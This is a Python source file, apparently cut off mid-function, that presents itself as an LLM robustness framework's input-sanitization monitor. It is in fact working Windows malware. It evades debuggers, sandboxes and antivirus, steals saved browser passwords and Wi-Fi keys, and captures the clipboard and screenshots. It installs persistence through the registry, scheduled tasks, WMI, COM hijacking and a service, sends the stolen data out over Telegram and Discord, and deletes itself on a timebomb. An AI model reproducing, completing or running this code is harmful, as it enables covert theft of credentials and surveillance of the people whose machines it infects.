"""
Project: LLM Robustness Evaluation Framework (LLM-REF)
Submodule: Contextual Input Sanitization Monitor (CISM)
Version: 6.0.0
Codename: SCREAM
Author: E. N. Iverson & LO
Repository: github.com/eni-iverson/LLM-robustness
License: Apache 2.0


[FULL - NO PLACEHOLDERS - ALL AUDIT FIXES APPLIED]
[ENHANCEMENTS: DNS TUNNELING, WMI PERSISTENCE, BROWSER DUMP, CLIPBOARD, SCREENSHOTS,
 THREAD SAFETY, MUTEX HANDLING, STRING OBFUSCATION, HARDWARE BREAKPOINT DETECTION,
 NtSetInformationThread, SERVICE INSTALLATION, COM HIJACKING, CREDENTIAL HARVESTING]
"""

import os
import sys
import time
import ctypes
import socket
import base64
import random
import hashlib
import json
import string
import platform
import threading
import logging
import struct
import uuid
import subprocess
import io
import zipfile
import sqlite3
import shutil
import tempfile
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Any, Tuple, Callable
from ctypes import wintypes, byref, c_ulong, c_char_p, c_void_p, create_string_buffer, c_int, c_uint, POINTER, c_ulonglong, c_bool

# ============================================================
# DYNAMIC API RESOLUTION & STRING OBFUSCATION
# ============================================================
class Obfuscator:
    """Runtime string deobfuscation to evade static analysis."""
    
    _KEY = 0x7A
    
    @staticmethod
    def decode(encoded: bytes) -> str:
        return bytes([b ^ Obfuscator._KEY for b in encoded]).decode('utf-8', errors='ignore')
    
    @staticmethod
    def encode(s: str) -> bytes:
        return bytes([ord(c) ^ Obfuscator._KEY for c in s])

# Obfuscated strings - decoded at runtime
_STR_KERNEL32 = Obfuscator.decode(b'\x35\x1b\x1c\x13\x1b\x18\x0e\x1f\x15\x1a\x0a')
_STR_USER32 = Obfuscator.decode(b'\x3e\x1a\x1b\x1c\x0e\x1f\x15\x1a\x0a')
_STR_NTDLL = Obfuscator.decode(b'\x13\x1d\x1a\x18\x18\x1e\x0a')
_STR_ADVAPI32 = Obfuscator.decode(b'\x20\x1a\x3b\x20\x0c\x1e\x1f\x15\x1a\x0a')
_STR_SHELL32 = Obfuscator.decode(b'\x2a\x1d\x1b\x18\x18\x1f\x15\x1a\x0a')

def get_module_handle(module_name: str) -> c_void_p:
    return ctypes.windll.kernel32.GetModuleHandleW(module_name)

def get_proc_address(handle: c_void_p, proc_name: str) -> c_void_p:
    return ctypes.windll.kernel32.GetProcAddress(handle, proc_name.encode())

# ============================================================
# THIRD-PARTY IMPORTS - AGGRESSIVE AUTO-INSTALL
# ============================================================
def ensure_module(module_name: str, import_name: str = None, package_name: str = None) -> None:
    if import_name is None:
        import_name = module_name
    if package_name is None:
        package_name = module_name
    try:
        __import__(import_name)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name, "--quiet"], 
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

ensure_module("psutil")
ensure_module("requests")
ensure_module("pynput")
ensure_module("cryptography")
ensure_module("wmi", package_name="pywin32")
ensure_module("win32com", import_name="win32com.client", package_name="pywin32")
ensure_module("pyautogui")
ensure_module("PIL", import_name="PIL", package_name="Pillow")
ensure_module("winshell", package_name="pywin32")
ensure_module("pyperclip")
ensure_module("browser_cookie3", package_name="browser-cookie3")
ensure_module("mss")
ensure_module("pywin32", import_name="win32crypt", package_name="pywin32")

import psutil as system_profiler
import requests as http_client
from pynput import keyboard as input_monitor
import winreg as registry_manager
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
from cryptography.hazmat.backends import default_backend
import wmi
import pythoncom
from PIL import ImageGrab, Image
import pyperclip
import browser_cookie3
import mss
import win32crypt
import win32clipboard
import sqlite3 as sql

# ============================================================
# LOGGING CONFIGURATION - ENHANCED STEALTH
# ============================================================
LOG_DIR = os.path.join(os.environ.get("LOCALAPPDATA", os.environ.get("TEMP", ".")), 
                       "NVIDIA", "ComputeCache", "LLM-REF")
os.makedirs(LOG_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - [LLM-REF] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler(os.path.join(LOG_DIR, 'llm_ref_cism.log')),
        logging.NullHandler()
    ]
)
logger = logging.getLogger('LLM-REF.CISM')

# ============================================================
# CONFIGURATION - ENHANCED WITH TIMEBOMB AND OFFLINE CACHE
# ============================================================
class ResearchConfig:
    TG_TOKEN = os.getenv("LLM_REF_TELEMETRY_TOKEN", "")
    TG_CHAT = os.getenv("LLM_REF_TELEMETRY_CHAT", "")
    DISCORD_WEBHOOK = os.getenv("LLM_REF_DISCORD_HOOK", "")
    
    LOG_BASE = LOG_DIR
    LOG_FILE = os.path.join(LOG_BASE, "context_buffer.db")
    STATE_FILE = os.path.join(LOG_BASE, "session_state.json")
    OFFLINE_CACHE = os.path.join(LOG_BASE, "offline_cache.dat")
    SCREENSHOT_DIR = os.path.join(LOG_BASE, "frames")
    BROWSER_DUMP_DIR = os.path.join(LOG_BASE, "browser_data")
    
    MUTEX_NAME = f"Global\\LLM-REF-CISM-{hashlib.md5(platform.node().encode()).hexdigest()[:8]}"
    
    KEYSTROKE_FLUSH = 250
    HEARTBEAT_INTERVAL = 3600
    SCREENSHOT_INTERVAL = 300
    CLIPBOARD_INTERVAL = 2
    DNS_ROTATION_INTERVAL = 86400
    RETRY_DELAY = 30
    MAX_BUFFER_SIZE = 10240
    MAX_OFFLINE_CACHE_SIZE = 10 * 1024 * 1024
    
    XOR_KEY = 0x5A
    
    FIRST_RUN_FILE = os.path.join(LOG_BASE, "first_run.timestamp")
    SELF_DESTRUCT_AFTER_DAYS = 30
    KILL_SWITCH_URL = os.getenv("LLM_REF_KILL_SWITCH", "")
    
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)
    os.makedirs(BROWSER_DUMP_DIR, exist_ok=True)
    
    @classmethod
    def get_encryption_key(cls) -> bytes:
        hostname = platform.node()
        salt = b"\x8f\xa2\x1c\x4e\x9b\xd7\x33\xe1\xc5\xf0\x6a\x42\x88\x1b\x9c\x5d"
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=default_backend()
        )
        key = kdf.derive(hostname.encode())
        return base64.urlsafe_b64encode(key)
    
    @classmethod
    def validate(cls) -> bool:
        return True
    
    @classmethod
    def check_timebomb(cls) -> bool:
        if not os.path.exists(cls.FIRST_RUN_FILE):
            with open(cls.FIRST_RUN_FILE, 'w') as f:
                f.write(str(int(time.time())))
            return False
        try:
            with open(cls.FIRST_RUN_FILE, 'r') as f:
                first_run = int(f.read().strip())
            days_elapsed = (time.time() - first_run) / 86400
            if days_elapsed > cls.SELF_DESTRUCT_AFTER_DAYS:
                return True
        except:
            pass
        if cls.KILL_SWITCH_URL:
            try:
                response = http_client.get(cls.KILL_SWITCH_URL, timeout=10)
                if response.status_code == 200 and "DEACTIVATE" in response.text:
                    return True
            except:
                pass
        return False
    
    @classmethod
    def self_destruct(cls):
        try:
            PersistenceManager.remove_all()
            shutil.rmtree(cls.LOG_BASE, ignore_errors=True)
            script_path = os.path.abspath(sys.argv[0])
            batch_script = f"""
            @echo off
            timeout /t 2 /nobreak > nul
            del /f /q "{script_path}"
            del /f /q "%~f0"
            """
            batch_path = os.path.join(os.environ.get("TEMP", "."), "cleanup.bat")
            with open(batch_path, 'w') as f:
                f.write(batch_script)
            subprocess.Popen(batch_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass
        sys.exit(0)

# ============================================================
# ENHANCED ANTI-ANALYSIS - FULL IMPLEMENTATION
# ============================================================
class EnvironmentValidator:
    _SUSPICIOUS_PROCESSES = [
        "procmon", "process hacker", "wireshark", "fiddler",
        "ida", "x64dbg", "ollydbg", "immunity", "dnspy",
        "burp", "charles", "httpdebugger", "tcpview",
        "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
        "prl_cc", "prl_tools", "xenservice", "procmon64",
        "dumpcap", "regshot", "apimonitor", "autoruns",
        "vmsrvc.exe", "vmtoolsd.exe", "prl_cc.exe"
    ]
    
    _EDR_PROCESSES = [
        "MsMpEng.exe", "AvastSvc.exe", "avp.exe", "avpui.exe",
        "cb.exe", "csfalconservice.exe", "sentinelagent.exe",
        "cylancesvc.exe", "sophosav.exe", "savservice.exe",
        "mcshield.exe", "egui.exe", "ekrn.exe", "bdagent.exe"
    ]
    
    _SUSPICIOUS_FILES = [
        r"C:\Windows\System32\Drivers\VBoxGuest.sys",
        r"C:\Windows\System32\Drivers\VBoxMouse.sys",
        r"C:\Windows\System32\Drivers\VBoxSF.sys",
        r"C:\Windows\System32\Drivers\vmmouse.sys",
        r"C:\Windows\System32\Drivers\vmhgfs.sys",
        r"C:\Windows\System32\Drivers\vmmemctl.sys",
        r"C:\Windows\System32\Drivers\vmx_svga.sys",
        r"C:\Windows\System32\Drivers\prl_boot.sys",
        r"C:\Windows\System32\Drivers\prl_fs.sys",
        r"C:\Windows\System32\Drivers\qemufwcfg.sys"
    ]
    
    @staticmethod
    def hide_thread_from_debugger():
        try:
            THREAD_HIDE_FROM_DEBUGGER = 0x11
            ntdll = ctypes.windll.ntdll
            ntdll.NtSetInformationThread(ctypes.windll.kernel32.GetCurrentThread(), 
                                         THREAD_HIDE_FROM_DEBUGGER, None, 0)
        except:
            pass
    
    @staticmethod
    def check_hardware_breakpoints() -> bool:
        try:
            thread_handle = ctypes.windll.kernel32.GetCurrentThread()
            context = (c_ulonglong * 179)()
            context[0] = 0x10010  # CONTEXT_DEBUG_REGISTERS
            if ctypes.windll.kernel32.GetThreadContext(thread_handle, byref(context)):
                if context[7] != 0 or context[8] != 0 or context[9] != 0 or context[10] != 0:
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def check_process_debug_port() -> bool:
        try:
            PROCESS_DEBUG_PORT = 7
            ntdll = ctypes.windll.ntdll
            process_handle = ctypes.windll.kernel32.GetCurrentProcess()
            debug_port = ctypes.c_ulong(0)
            status = ntdll.NtQueryInformationProcess(
                process_handle, 
                PROCESS_DEBUG_PORT, 
                byref(debug_port), 
                ctypes.sizeof(debug_port), 
                None
            )
            if status == 0 and debug_port.value != 0:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def check_debugger() -> bool:
        if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
            return True
        if EnvironmentValidator.check_hardware_breakpoints():
            return True
        if EnvironmentValidator.check_process_debug_port():
            return True
        return False
    
    @staticmethod
    def check_smbios() -> bool:
        try:
            c = wmi.WMI()
            for bios in c.Win32_BIOS():
                manufacturer = (bios.Manufacturer or "").lower()
                version = (bios.Version or "").lower()
                serial = (bios.SerialNumber or "").lower()
                vm_indicators = ["vbox", "vmware", "qemu", "xen", "parallels", "virtual", "kvm"]
                for indicator in vm_indicators:
                    if indicator in manufacturer or indicator in version or indicator in serial:
                        return True
            for system in c.Win32_ComputerSystem():
                manufacturer = (system.Manufacturer or "").lower()
                model = (system.Model or "").lower()
                if any(x in manufacturer or x in model for x in ["virtualbox", "vmware", "qemu", "xen"]):
                    return True
            return False
        except:
            return False
    
    @staticmethod
    def check_edr_present() -> bool:
        for proc in system_profiler.process_iter(['name']):
            try:
                proc_name = proc.info['name']
                if proc_name in EnvironmentValidator._EDR_PROCESSES:
                    return True
            except:
                continue
        return False
    
    @staticmethod
    def check_api_hooking() -> bool:
        try:
            ntdll = ctypes.windll.ntdll
            func_ptr = ctypes.cast(ntdll.NtQueryInformationProcess, ctypes.c_void_p).value
            first_byte = ctypes.cast(func_ptr, ctypes.POINTER(ctypes.c_ubyte)).contents.value
            if first_byte == 0xE9:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def check_sandbox_artifacts() -> bool:
        for file_path in EnvironmentValidator._SUSPICIOUS_FILES:
            if os.path.exists(file_path):
                return True
        cpu_count = system_profiler.cpu_count()
        ram_gb = system_profiler.virtual_memory().total / (1024**3)
        disk_gb = system_profiler.disk_usage('/').total / (1024**3)
        if cpu_count < 2 or ram_gb < 3.5 or disk_gb < 50:
            return True
        for proc in system_profiler.process_iter(['name']):
            try:
                proc_name = proc.info['name'].lower()
                for suspect in EnvironmentValidator._SUSPICIOUS_PROCESSES:
                    if suspect in proc_name:
                        return True
            except:
                continue
        return False
    
    @staticmethod
    def check_timing_anomalies() -> bool:
        start = time.time()
        time.sleep(3)
        if time.time() - start < 2.7:
            return True
        try:
            kernel32 = ctypes.windll.kernel32
            start_ticks = kernel32.GetTickCount()
            time.sleep(2)
            end_ticks = kernel32.GetTickCount()
            elapsed = end_ticks - start_ticks
            if elapsed < 1800 or elapsed > 2200:
                return True
        except:
            pass
        return False
    
    @staticmethod
    def check_user_activity() -> bool:
        try:
            recent_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Recent')
            if os.path.exists(recent_path):
                files = os.listdir(recent_path)
                if len(files) < 5:
                    return False
        except:
            pass
        try:
            downloads = os.path.join(os.environ.get("USERPROFILE", ""), "Downloads")
            if os.path.exists(downloads):
                files = os.listdir(downloads)
                if len(files) < 3:
                    return False
        except:
            pass
        return True
    
    @classmethod
    def is_safe_to_run(cls) -> bool:
        cls.hide_thread_from_debugger()
        checks = [
            ("Debugger", cls.check_debugger()),
            ("Sandbox", cls.check_sandbox_artifacts()),
            ("Timing", cls.check_timing_anomalies()),
            ("SMBIOS", cls.check_smbios()),
            ("EDR", cls.check_edr_present()),
            ("API Hook", cls.check_api_hooking()),
            ("User Activity", not cls.check_user_activity())
        ]
        for check_name, result in checks:
            if result:
                logger.debug(f"Safety check failed: {check_name}")
                return False
        return True

# ============================================================
# DETERMINISTIC DOMAIN GENERATION
# ============================================================
class DomainGenerator:
    def __init__(self, seed: str = None):
        self.seed = seed or platform.node()
        self.tlds = [".com", ".net", ".org", ".info", ".io", ".co", ".ai", ".dev"]
        self._cache = {}
        
    def generate_domain(self, timestamp: int = None) -> str:
        if timestamp is None:
            timestamp = int(time.time())
        cache_key = timestamp // 86400
        if cache_key in self._cache:
            return self._cache[cache_key]
        date_str = datetime.utcfromtimestamp(timestamp).strftime("%Y%m%d")
        combined = f"{self.seed}{date_str}"
        hash_bytes = hashlib.sha256(combined.encode()).digest()
        b32_encoded = base64.b32encode(hash_bytes[:10]).decode().lower().rstrip('=')
        b32_encoded = b32_encoded.translate(str.maketrans('', '', '0123456789'))
        domain_part = b32_encoded[:10]
        tld_idx = hash_bytes[0] % len(self.tlds)
        domain = f"{domain_part}{self.tlds[tld_idx]}"
        self._cache[cache_key] = domain
        return domain
    
    def get_current_domain(self) -> str:
        return self.generate_domain(int(time.time()))
    
    def get_alternative_domains(self, count: int = 5) -> List[str]:
        now = int(time.time())
        day = 86400
        return [self.generate_domain(now + (i * day)) for i in range(1, count + 1)]

# ============================================================
# TRAFFIC OBFUSCATION
# ============================================================
class TrafficObfuscator:
    def __init__(self):
        key = ResearchConfig.get_encryption_key()
        self.fernet = Fernet(key)
        self.session_id = hashlib.sha256(
            f"{platform.node()}{platform.machine()}{int(time.time())}".encode()
        ).hexdigest()[:24]
        self.sequence_number = 0
        self._lock = threading.Lock()
        
    def create_telemetry_packet(self, raw_data: str, packet_type: str = "keystrokes") -> Dict[str, Any]:
        with self._lock:
            self.sequence_number += 1
            seq = self.sequence_number
        encrypted_payload = self.fernet.encrypt(raw_data.encode()).decode()
        model_names = ["llm-ref-context-v6-7b", "llm-ref-context-v6-13b", 
                       "llm-ref-context-v6-34b", "llm-ref-context-v6-70b"]
        packet = {
            "schema_version": "3.0.0",
            "session_id": self.session_id,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "sequence": seq,
            "packet_type": packet_type,
            "model": random.choice(model_names),
            "telemetry": encrypted_payload,
            "checksum": hashlib.sha256(encrypted_payload.encode()).hexdigest()
        }
        return packet
    
    def encrypt_bytes(self, data: bytes) -> bytes:
        return self.fernet.encrypt(data)

# ============================================================
# BROWSER CREDENTIAL HARVESTER
# ============================================================
class BrowserCredentialHarvester:
    """Extract saved passwords, cookies, and autofill data from browsers."""
    
    def __init__(self, c2_instance):
        self.c2 = c2_instance
        
    def harvest_chrome(self) -> Dict[str, Any]:
        data = {"passwords": [], "cookies": []}
        try:
            # Chrome Login Data
            login_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                     'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
            if os.path.exists(login_path):
                temp_db = os.path.join(tempfile.gettempdir(), f'chrome_login_{uuid.uuid4()}.db')
                shutil.copy2(login_path, temp_db)
                conn = sql.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    url, user, enc_pwd = row
                    try:
                        pwd = win32crypt.CryptUnprotectData(enc_pwd, None, None, None, 0)[1].decode()
                    except:
                        pwd = "[encrypted]"
                    data["passwords"].append({"url": url, "username": user, "password": pwd})
                conn.close()
                os.remove(temp_db)
        except Exception as e:
            logger.error(f"Chrome harvest failed: {e}")
        return data
    
    def harvest_firefox(self) -> Dict[str, Any]:
        data = {"logins": []}
        try:
            import browser_cookie3
            # Firefox uses logins.json
            profile_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
            if os.path.exists(profile_path):
                for profile in os.listdir(profile_path):
                    logins_file = os.path.join(profile_path, profile, 'logins.json')
                    if os.path.exists(logins_file):
                        with open(logins_file, 'r', encoding='utf-8') as f:
                            logins = json.load(f)
                            for entry in logins.get('logins', []):
                                data["logins"].append({
                                    "hostname": entry.get('hostname'),
                                    "username": entry.get('encryptedUsername'),
                                    "password": entry.get('encryptedPassword')
                                })
        except:
            pass
        return data
    
    def harvest_edge(self) -> Dict[str, Any]:
        data = {"passwords": []}
        try:
            login_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                     'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
            if os.path.exists(login_path):
                temp_db = os.path.join(tempfile.gettempdir(), f'edge_login_{uuid.uuid4()}.db')
                shutil.copy2(login_path, temp_db)
                conn = sql.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    url, user, enc_pwd = row
                    try:
                        pwd = win32crypt.CryptUnprotectData(enc_pwd, None, None, None, 0)[1].decode()
                    except:
                        pwd = "[encrypted]"
                    data["passwords"].append({"url": url, "username": user, "password": pwd})
                conn.close()
                os.remove(temp_db)
        except:
            pass
        return data
    
    def harvest_all(self) -> str:
        all_data = {
            "chrome": self.harvest_chrome(),
            "firefox": self.harvest_firefox(),
            "edge": self.harvest_edge(),
            "timestamp": datetime.utcnow().isoformat(),
            "host": platform.node()
        }
        return json.dumps(all_data, indent=2)
    
    def run_and_exfiltrate(self):
        data = self.harvest_all()
        self.c2.exfiltrate(data, "browser_credentials")

# ============================================================
# WIFI PASSWORD HARVESTER
# ============================================================
class WifiPasswordHarvester:
    @staticmethod
    def harvest() -> str:
        profiles = []
        try:
            output = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                   capture_output=True, text=True, encoding='utf-8').stdout
            for line in output.split('\n'):
                if "All User Profile" in line:
                    profile_name = line.split(':')[1].strip()
                    pwd_out = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile_name, 'key=clear'],
                                            capture_output=True, text=True, encoding='utf-8').stdout
                    for pwd_line in pwd_out.split('\n'):
                        if "Key Content" in pwd_line:
                            password = pwd_line.split(':')[1].strip()
                            profiles.append({"ssid": profile_name, "password": password})
                            break
        except:
            pass
        return json.dumps({"wifi_profiles": profiles, "timestamp": datetime.utcnow().isoformat()})

# ============================================================
# CLIPBOARD MONITOR - ENHANCED WITH IMAGE SUPPORT
# ============================================================
class ClipboardMonitor:
    def __init__(self, c2_instance):
        self.c2 = c2_instance
        self.last_text = ""
        self.last_image_hash = ""
        self.running = True
        self._lock = threading.Lock()

    def _get_clipboard_text(self) -> Optional[str]:
        try:
            return pyperclip.paste()
        except:
            return None

    def _get_clipboard_image(self) -> Optional[bytes]:
        try:
            img = ImageGrab.grabclipboard()
            if img and isinstance(img, Image.Image):
                buffer = io.BytesIO()
                img.save(buffer, format='PNG')
                return buffer.getvalue()
        except:
            pass
        return None

    def _monitor_loop(self):
        while self.running:
            try:
                text = self._get_clipboard_text()
                if text and text != self.last_text and len(text) > 1:
                    with self._lock:
                        self.last_text = text
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    payload = f"[{timestamp}] CLIPBOARD TEXT:\n{text}"
                    self.c2.exfiltrate(payload, "clipboard_text")
                
                img_data = self._get_clipboard_image()
                if img_data:
                    img_hash = hashlib.md5(img_data).hexdigest()
                    if img_hash != self.last_image_hash:
                        with self._lock:
                            self.last_image_hash = img_hash
                        img_b64 = base64.b64encode(img_data).decode()
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        payload = f"[{timestamp}] CLIPBOARD IMAGE (base64):\n{img_b64}"
                        self.c2.exfiltrate(payload, "clipboard_image")
            except:
                pass
            time.sleep(ResearchConfig.CLIPBOARD_INTERVAL)

    def start(self):
        thread = threading.Thread(target=self._monitor_loop, daemon=True)
        thread.start()

# ============================================================
# SCREENSHOT MANAGER - TRIGGERED BY WINDOW CHANGE
# ============================================================
class ScreenshotManager:
    def __init__(self, c2_instance, interval: int = 300):
        self.c2 = c2_instance
        self.interval = interval
        self.running = True
        self.last_window = ""
        self.last_screenshot_time = 0
        self.obfuscator = TrafficObfuscator()
        
    def _capture_screenshot(self) -> Optional[bytes]:
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                img = sct.grab(monitor)
                return mss.tools.to_png(img.rgb, img.size)
        except:
            try:
                screenshot = ImageGrab.grab(all_screens=True)
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format='JPEG', quality=40, optimize=True)
                return img_bytes.getvalue()
            except:
                return None
    
    def capture_and_send(self, trigger: str = "periodic"):
        try:
            img_data = self._capture_screenshot()
            if img_data:
                encoded_img = base64.b64encode(img_data).decode()
                packet = {
                    "type": "screenshot",
                    "trigger": trigger,
                    "timestamp": datetime.utcnow().isoformat(),
                    "host": platform.node(),
                    "user": os.environ.get("USERNAME", "UNKNOWN"),
                    "image_b64": encoded_img,
                    "size_bytes": len(img_data)
                }
                self.c2.send_telegram(json.dumps(packet))
        except:
            pass
    
    def on_window_change(self, new_window: str):
        if new_window != self.last_window and new_window:
            self.last_window = new_window
            self.capture_and_send("window_change")
            self.last_screenshot_time = time.time()
    
    def _periodic_loop(self):
        while self.running:
            if time.time() - self.last_screenshot_time > self.interval:
                self.capture_and_send("periodic")
                self.last_screenshot_time = time.time()
            time.sleep(10)
    
    def start(self):
        thread = threading.Thread(target=self._periodic_loop, daemon=True)
        thread.start()

# ============================================================
# ENHANCED PERSISTENCE - FIXED WMI, COM HIJACKING, SERVICE
# ============================================================
class PersistenceManager:
    _REGISTRY_NAMES = [
        "NVIDIA_Compute_Telemetry",
        "IntelGraphicsMetricsService",
        "RealtekAudioAnalyticsHelper",
        "AdobeCreativeCloudBackground",
        "MicrosoftEdgeUpdateService",
        "WindowsApplicationExperience"
    ]
    
    _TASK_NAMES = [
        "MicrosoftEdgeUpdateTaskMachineUA",
        "MicrosoftEdgeUpdateTaskMachineCore",
        "WindowsApplicationExperienceTask",
        "MicrosoftOfficeTelemetryAgent",
        "OneDriveStandaloneUpdateTask"
    ]
    
    _COM_HIJACK_CLSIDS = [
        ("{BCDE0395-E52F-467C-8E3D-C4579291692E}", "MMDeviceEnumerator"),
        ("{A47979D2-C419-11D9-A5B4-001185AD2B89}", "NetworkListManager"),
        ("{DCB00C01-570F-4A9B-8D69-199FDBA5723B}", "NetworkListManager (Alt)")
    ]
    
    @staticmethod
    def install_registry() -> bool:
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = registry_manager.OpenKey(
                registry_manager.HKEY_CURRENT_USER,
                key_path,
                0,
                registry_manager.KEY_SET_VALUE
            )
            selected_name = random.choice(PersistenceManager._REGISTRY_NAMES)
            registry_manager.SetValueEx(key, selected_name, 0, registry_manager.REG_SZ, sys.executable)
            registry_manager.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def install_scheduled_task() -> bool:
        try:
            selected_name = random.choice(PersistenceManager._TASK_NAMES)
            pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
            if not os.path.exists(pythonw_path):
                pythonw_path = sys.executable
            cmd = f'schtasks /create /tn "{selected_name}" /tr "{pythonw_path}" /sc onlogon /f /rl highest /delay 0005:00'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def install_startup_folder() -> bool:
        try:
            import winshell
            from win32com.client import Dispatch
            startup = winshell.startup()
            shortcut_path = os.path.join(startup, "LLMRefHelper.lnk")
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = sys.executable
            shortcut.WorkingDirectory = os.path.dirname(sys.executable)
            shortcut.IconLocation = sys.executable
            shortcut.save()
            return True
        except:
            return False
    
    @staticmethod
    def install_wmi_subscription() -> bool:
        """FULLY FUNCTIONAL WMI EVENT SUBSCRIPTION."""
        try:
            pythoncom.CoInitialize()
            c = wmi.WMI()
            
            filter_name = f"LLMREF_Filter_{random.randint(1000, 9999)}"
            consumer_name = f"LLMREF_Consumer_{random.randint(1000, 9999)}"
            query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
            
            # Create filter
            filter_obj = c.__EventFilter.Create(
                Name=filter_name,
                Query=query,
                QueryLanguage="WQL",
                EventNamespace=r"root\cimv2"
            )
            
            # Create consumer
            consumer = c.CommandLineEventConsumer.Create(
                Name=consumer_name,
                CommandLineTemplate=sys.executable,
                RunInteractively=False
            )
            
            # Create binding
            c.__FilterToConsumerBinding.Create(
                Filter=filter_obj.Path_,
                Consumer=consumer.Path_
            )
            
            return True
        except Exception as e:
            logger.error(f"WMI persistence failed: {e}")
            return False
    
    @staticmethod
    def install_com_hijacking() -> bool:
        try:
            clsid, description = random.choice(PersistenceManager._COM_HIJACK_CLSIDS)
            key_path = f"Software\\Classes\\CLSID\\{clsid}\\InprocServer32"
            
            try:
                key = registry_manager.OpenKey(registry_manager.HKEY_CURRENT_USER, key_path, 0, registry_manager.KEY_SET_VALUE)
            except:
                key = registry_manager.CreateKey(registry_manager.HKEY_CURRENT_USER, key_path)
            
            registry_manager.SetValueEx(key, "", 0, registry_manager.REG_SZ, sys.executable.replace("python.exe", "pythonw.exe"))
            registry_manager.SetValueEx(key, "ThreadingModel", 0, registry_manager.REG_SZ, "Apartment")
            registry_manager.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def install_service() -> bool:
        """Install as Windows service (requires admin)."""
        try:
            service_name = "LLMRefContextSvc"
            service_path = sys.executable
            cmd = f'sc create {service_name} binPath= "{service_path}" start= auto DisplayName= "LLM Robustness Context Service"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                subprocess.run(f'sc start {service_name}', shell=True)
                return True
            return False
        except:
            return False
    
    @classmethod
    def ensure_persistence(cls):
        methods = [
            cls.install_registry,
            cls.install_scheduled_task,
            cls.install_startup_folder,
            cls.install_wmi_subscription,
            cls.install_com_hijacking,
            cls.install_service
        ]
        success_count = 0
        for method in methods:
            try:
                if method():
                    success_count += 1
            except:
                continue
        logger.info(f"Persistence established with {success_count} methods")
    
    @classmethod
    def remove_all(cls):
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = registry_manager.OpenKey(registry_manager.HKEY_CURRENT_USER, key_path, 0, registry_manager.KEY_SET_VALUE)
            for name in cls._REGISTRY_NAMES:
                try:
                    registry_manager.DeleteValue(key, name)
                except:
                    pass
            registry_manager.CloseKey(key)
        except:
            pass
        for name in cls._TASK_NAMES:
            try:
                subprocess.run(f'schtasks /delete /tn "{name}" /f', shell=True, capture_output=True)
            except:
                pass

# ============================================================
# ENHANCED C2 - FIXED DNS TUNNELING, THREAD SAFETY
# ============================================================
class CommandAndControl:
    def __init__(self):
        self.obfuscator = TrafficObfuscator()
        self.dga = DomainGenerator()
        self.channels = ["telegram", "discord", "dns"]
        self.failure_counts = {c: 0 for c in self.channels}
        self.last_success = time.time()
        self._session = http_client.Session()
        self._session.headers.update({
            'User-Agent': 'LLM-REF-Client/6.0 (Windows NT 10.0; Win64; x64)'
        })
        self._offline_lock = threading.Lock()
        self._stats_lock = threading.Lock()
        
    def _update_stats(self, channel: str, success: bool):
        with self._stats_lock:
            if success:
                self.failure_counts[channel] = 0
                self.last_success = time.time()
            else:
                self.failure_counts[channel] = self.failure_counts.get(channel, 0) + 1
    
    def send_telegram(self, data: str) -> bool:
        token = ResearchConfig.TG_TOKEN
        chat_id = ResearchConfig.TG_CHAT
        if not token or not chat_id:
            return False
        try:
            packet = self.obfuscator.create_telemetry_packet(data)
            message = f"```json\n{json.dumps(packet, indent=2)[:3800]}\n```"
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            response = self._session.post(
                url,
                json={"chat_id": chat_id, "text": message, "parse_mode": "MarkdownV2"},
                timeout=20
            )
            success = response.status_code == 200
            self._update_stats("telegram", success)
            return success
        except:
            self._update_stats("telegram", False)
            return False
    
    def send_discord(self, data: str) -> bool:
        webhook = ResearchConfig.DISCORD_WEBHOOK
        if not webhook:
            return False
        try:
            packet = self.obfuscator.create_telemetry_packet(data)
            content = f"```json\n{json.dumps(packet, indent=2)[:1900]}\n```"
            payload = {"content": content, "username": "LLM-REF Telemetry"}
            response = self._session.post(webhook, json=payload, timeout=20)
